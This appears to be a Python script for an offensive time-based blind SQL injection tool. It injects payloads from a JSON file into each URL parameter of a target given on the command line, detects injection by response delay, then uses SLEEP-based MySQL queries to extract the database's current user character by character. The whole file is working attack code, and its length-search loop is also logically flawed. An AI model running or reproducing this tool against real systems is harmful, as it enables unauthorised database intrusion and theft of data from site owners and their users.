import requests
import sys
import lib.help as help
import lib.url_parser as url_parser
import time
import random
import json

quotes = ["'", "\""," "]
suffixes = "-- "
random_number_for_sleep = random.randint(3,9)
random_number_for_operation = random.randint (1111,9999)
random_string = ''.join((random.choice('abcdxyzpqr') for i in range(4)))
def checkResponseBody():
    pass

f = open('payloads/time_blind.json')
data = json.load(f)
def checkTimeBlindSQLI(extractedPath,extractedParameters):
    for i in range(0, len(extractedParameters)):
        for x in data:
            for y in quotes:
                print("[+] Checking Blind SQL Injection")
                print(f"[?] Checking {extractedParameters[i].split('=')[0]} parameter")
                print(f"[+] Waiting  {random_number_for_sleep} seconds...")
                payload = x["payload"].replace("[SLEEPTIME]", str(random_number_for_sleep))
                payload = payload.replace("[RANDNUM]", str(random_number_for_operation))
                payload = payload.replace("[RANDSTR]", str(random_string))
                parameter_save = extractedParameters[i]
                print(payload)
                extractedParameters[i] = extractedParameters[i] + y + " " + payload + suffixes
                # print(i)
                full_path = "&".join(str(parameter) for parameter in extractedParameters)
                print(full_path)
                extractedParameters[i] = parameter_save
                check_injection = extractedPath + "?" + full_path
                print(check_injection)
                start = time.time()
                res = requests.get(check_injection)
                end = time.time()
                print(end-start)
                
                if end-start >= random_number_for_sleep:
                    print("sqli detected, payload:" + str(payload))
                    print("database is:" + str(x["database"]))
                    getCurrentUser(extractedPath, i, extractedParameters)
                print("------------------------------------------------------------")


def getCurrentUser(url,injectable_parameter,path):
    current_user_length = 25
    while True:
        parameter_save = path[injectable_parameter]
        path[injectable_parameter] += f" AND SLEEP(7-IF(LENGTH(CURRENT_USER)={current_user_length},0,7))-- "
        full_path = "&".join(str(parameter) for parameter in path)
        start = time.time()
        res = requests.get( url + "?" + full_path)
        end = time.time()
        print(url + "?" + full_path)
        path[injectable_parameter] = parameter_save
        if end-start > 7:
            print(f"current user length is {current_user_length}")
            length = 1
            current_user = ""
            while length != current_user_length+1:
                for a in range(48,127):
                    path[injectable_parameter] += f" AND (SELECT 6261 FROM (SELECT(SLEEP(7-(IF(ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),{length},1))={a},0,7)))))Gttg)-- "
                    full_path = "&".join(str(parameter) for parameter in path)
                    start = time.time()
                    res = requests.get( url + "?" + full_path)
                    end = time.time()
                    print(url + "?" + full_path)
                    path[injectable_parameter] = parameter_save
                    if end-start > 7:
                        current_user +=chr(a)
                        length+=1
                        
                        print(current_user)
                        break
                
            exit(0)
            current_user_length -=1



def init():
    if len(sys.argv) > 2:
        if sys.argv[1] == "-h" or sys.argv[1] == "--help":
            print(help.usage)
        elif sys.argv[1] == "-u" or sys.argv[1] == "--url":
            return sys.argv[2]
        else:
            print(help.usage + help.syntax)
    else:
        print(help.usage + help.syntax)

    


def main():
    target = init()
    extractedPath = url_parser.extractPath(target)
    extractedParameters = url_parser.extractParameters(target)
    checkTimeBlindSQLI(extractedPath,extractedParameters)



main()    


